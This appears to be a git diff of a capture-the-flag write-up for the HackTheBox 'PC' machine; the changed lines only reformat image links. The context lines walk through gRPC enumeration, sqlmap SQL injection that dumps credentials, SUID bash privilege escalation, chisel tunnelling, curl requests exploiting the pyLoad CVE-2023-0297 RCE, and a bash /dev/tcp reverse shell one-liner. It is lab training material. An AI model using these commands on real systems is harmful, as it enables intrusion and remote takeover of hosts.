@@ -39,19 +39,19 @@ After connecting to the VPN service, click on Join Machine to access the machine
 
 After joining the machine you could see the IP Address of the target machine.
 
-![[PC/assets/Untitled.png|Untitled.png]]
+![Untitled.png](PC/assets/Untitled.png)
 
 ### Step - 04:
 
 Now run `rustscan` to look out for open ports.
 
-![[PC/assets/Untitled 1.png|Untitled 1.png]]
+![Untitled 1.png](PC/assets/Untitled%201.png)
 
 From the results of `rustscan`, we can see that two ports are open. So, I ran nmap on these ports to enumerate more details.You can also see that the machine is blocking ping probes, so use the `-Pn` flag.
 
 Command: `nmap -A -T4 -p 22,50051 -Pn <IP>`
 
-![[PC/assets/Untitled 2.png|Untitled 2.png]]
+![Untitled 2.png](PC/assets/Untitled%202.png)
 
 If we take a look at port `50051`, it returns some data, which is unrecognised. On further research about port `50051`, found the following: [https://grpc.io/](https://grpc.io/). Port `50051` , is running the gRPC service, a Remote Procedure Call (RPC) framework developed by google.
 
@@ -67,13 +67,13 @@ https://github.com/fullstorydev/grpcui
 
 After installing the tool, run the following command: `grpcui -plaintext 10.10.11.214:50051`
 
-![[PC/assets/Untitled 3.png|Untitled 3.png]]
+![Untitled 3.png](PC/assets/Untitled%203.png)
 
 And also from the above write-up, I inferred that this service might be vulnerable to `SQL Injection`.
 
 Now visit the `grpcui` Web UI hosted at [`http://127.0.0.1:43021`](http://127.0.0.1:43021) [ Note: The port number might differ in your case ]
 
-![[PC/assets/Untitled 4.png|Untitled 4.png]]
+![Untitled 4.png](PC/assets/Untitled%204.png)
 
 We can see that the gRPC service is a `SimpleApp` with `register`, `login` and `getinfo` features.
 
@@ -83,27 +83,27 @@ username: `something`
 
 password: `something`
 
-![[PC/assets/Untitled 5.png|Untitled 5.png]]
+![Untitled 5.png](PC/assets/Untitled%205.png)
 
 Successfully created a user with the name `something`
 
 Next I tried to login with the created user.
 
-![[PC/assets/Untitled 6.png|Untitled 6.png]]
+![Untitled 6.png](PC/assets/Untitled%206.png)
 
 Successfully logged in!!! We got the `id` and the `token` for the user `something`. Note the id and token.
 
 Now I tried the `getinfo` feature. I used the id and token that we noted in the previous step.
 
-![[PC/assets/Untitled 7.png|Untitled 7.png]]
+![Untitled 7.png](PC/assets/Untitled%207.png)
 
 My Request was successful, but there was no details in the response, instead it was an empty object.
 
-![[PC/assets/Untitled 8.png|Untitled 8.png]]
+![Untitled 8.png](PC/assets/Untitled%208.png)
 
 Now we are able to successfully send request to the `getInfo` feature. The `id` value in the `getinfo` tab might be vulnerable to SQL injection. So I again tried the `getInfo` function, but this time I captured the request with burpsuite and I saved the request as a file.
 
-![[PC/assets/Screencast_from_2023-08-07_14-27-39.webm]]
+![Screencast_from_2023-08-07_14-27-39](PC/assets/Screencast_from_2023-08-07_14-27-39.webm)
 
 Now using the saved request file, I used `sqlmap` to check out for SQL Injection using the following command:
 
@@ -118,9 +118,9 @@ sqlmap -r request --flush-session --threads 10 --batch -p id --level 3 --risk 3
 // -p : to specify the Testable parameter(s)
 ```
 
-![[PC/assets/Untitled 9.png|Untitled 9.png]]
+![Untitled 9.png](PC/assets/Untitled%209.png)
 
-![[PC/assets/Untitled 10.png|Untitled 10.png]]
+![Untitled 10.png](PC/assets/Untitled%2010.png)
 
 From the output of `sqlmap`, we can see that the `id` parameter is vulnerable to SQL Injection and from the output we can see that the database used by the gRPC service is `sqlite`.
 
@@ -138,7 +138,7 @@ sqlmap -r request --flush-session --threads 10 --batch -p id --level 3 --risk 3 
 // --dump : Dump DBMS database table entries
 ```
 
-![[PC/assets/Untitled 11.png|Untitled 11.png]]
+![Untitled 11.png](PC/assets/Untitled%2011.png)
 
 From the results of `sqlmap`, we have found a new credential:
 
@@ -148,11 +148,11 @@ password: `HereIsYourPassWord1431`
 
 I tried to login via SSH using the above credentials and got in.
 
-![[PC/assets/Untitled 12.png|Untitled 12.png]]
+![Untitled 12.png](PC/assets/Untitled%2012.png)
 
 I listed out the current directory and found the user flag.
 
-![[PC/assets/Untitled 13.png|Untitled 13.png]]
+![Untitled 13.png](PC/assets/Untitled%2013.png)
 
 And also, in the current directory, found the following tools:
 
@@ -168,7 +168,7 @@ I first ran [`linpeas.sh`](http://linpeas.sh) , looking out for privilege escala
 
 ### **Method 1**
 
-![[PC/assets/Untitled 14.png|Untitled 14.png]]
+![Untitled 14.png](PC/assets/Untitled%2014.png)
 
 From the output of `linpeas.sh`, we can see that the `/usr/bin/bash` has a SUID bit set on it.
 
@@ -177,7 +177,7 @@ If you check GTFObins [https://gtfobins.github.io/gtfobins/bash/#suid](https://g
 > [!important]  
 > To learn more about SUID, check out: https://thamizhiniyancs.notion.site/SUID-3f467c4031c44d7d926eef3e1bff60fb?pvs=4  
 
-![[PC/assets/Untitled 15.png|Untitled 15.png]]
+![Untitled 15.png](PC/assets/Untitled%2015.png)
 
 We have successfully obtained the root flag.
 
@@ -185,7 +185,7 @@ We have successfully obtained the root flag.
 
 ### **Method 2**
 
-![[PC/assets/Untitled 16.png|Untitled 16.png]]
+![Untitled 16.png](PC/assets/Untitled%2016.png)
 
 From the output of `linpeas.sh`, we can see that a service is running on port `8000` locally on the target machine.
 
@@ -195,7 +195,7 @@ To do that we have to have the same version of chisel on both attacking and targ
 
 First lets check the chisel version available in the target machine.
 
-![[PC/assets/Untitled 17.png|Untitled 17.png]]
+![Untitled 17.png](PC/assets/Untitled%2017.png)
 
 The target machine has chisel version 1.8.1.
 
@@ -205,7 +205,7 @@ Now from the attacking machine run the following command to create the chisel se
 
 `chisel server -p 9001 --reverse`
 
-![[PC/assets/Untitled 18.png|Untitled 18.png]]
+![Untitled 18.png](PC/assets/Untitled%2018.png)
 
 Next on the target machine run the following command to setup the client and also to port forward the internal service:
 
@@ -213,21 +213,21 @@ Next on the target machine run the following command to setup the client and als
 
 Once you run the above command, if you check the server, you can see that the connection is established.
 
-![[PC/assets/Untitled 19.png|Untitled 19.png]]
+![Untitled 19.png](PC/assets/Untitled%2019.png)
 
 Now in the attack machine, go to `localhost:5000` to take a look at the service running on the target machine.
 
-![[PC/assets/Untitled 20.png|Untitled 20.png]]
+![Untitled 20.png](PC/assets/Untitled%2020.png)
 
 You can see that, `pyload` is running on the target machine on port `8000` internally.
 
 From another terminal, I logged in via SSH to the target machine as `sau` to check the version of `pyload` running.
 
-![[PC/assets/Untitled 21.png|Untitled 21.png]]
+![Untitled 21.png](PC/assets/Untitled%2021.png)
 
 The version of `pyload` running is `0.5.0`. On searching exploits for this version of payload, found the following website: [https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad) , which showcased the RCE vulnerability on this version of `pyload`.
 
-![[PC/assets/Untitled 22.png|Untitled 22.png]]
+![Untitled 22.png](PC/assets/Untitled%2022.png)
 
 We have found the exploit. Now we can modify it to our needs and run the exploit.
 
@@ -246,11 +246,11 @@ curl -i -s -k -X $'POST' \
 
 If we run the above exploit, we can see that an error is thrown.
 
-![[PC/assets/Untitled 23.png]]
+![Untitled 23](PC/assets/Untitled%2023.png)
 
 But if we open another terminal and login to the target machine via SSH as `sau` and check the `/tmp` directory we can see that a `rev.sh` file is created with root permissions.
 
-![[PC/assets/Untitled 24.png]]
+![Untitled 24](PC/assets/Untitled%2024.png)
 
 Now we have to provide permissions to all the users to read, write and execute, since the owner of the file is root. To do this use the following exploit:
 
@@ -264,7 +264,7 @@ curl -i -s -k -X $'POST' \
 
 After executing the above command, if check the file permissions of the [`rev.sh`](http://rev.sh) file, you can see that all users have all permissions.
 
-![[PC/assets/Untitled 25.png]]
+![Untitled 25](PC/assets/Untitled%2025.png)
 
 Now we can edit the [`rev.sh`](http://rev.sh) file. Add the following content to the `rev.sh` file to create a reverse shell.
 
@@ -273,13 +273,13 @@ Now we can edit the [`rev.sh`](http://rev.sh) file. Add the following content to
 bash -i >& /dev/tcp/<HTB_tunnel_IP>/9002 0>&1
 ```
 
-![[PC/assets/Untitled 26.png]]
+![Untitled 26](PC/assets/Untitled%2026.png)
 
 Don’t try to execute the reverse shell from the target machine, as you will get the reverse shell only with the privileges of `sau` , as the `rev.sh` file is executed by that user.
 
 Before executing the reverse shell, start a `netcat` listener on the attacking machine.
 
-![[PC/assets/Untitled 27.png]]
+![Untitled 27](PC/assets/Untitled%2027.png)
 
 Now run the following command to execute the reverse shell as root:
 
@@ -291,15 +291,15 @@ curl -i -s -k -X $'POST' \
 // Commands are URL encoded
 ```
 
-![[PC/assets/Untitled 28.png]]
+![Untitled 28](PC/assets/Untitled%2028.png)
 
 After executing the above command, check the `netcat` listener that you created.
 
-![[PC/assets/Untitled 29.png]]
+![Untitled 29](PC/assets/Untitled%2029.png)
 
 We have successfully obtained the reverse shell with root privileges.
 
-![[PC/assets/Untitled 30.png]]
+![Untitled 30](PC/assets/Untitled%2030.png)
 
 And we have successfully obtained the root flag.
 
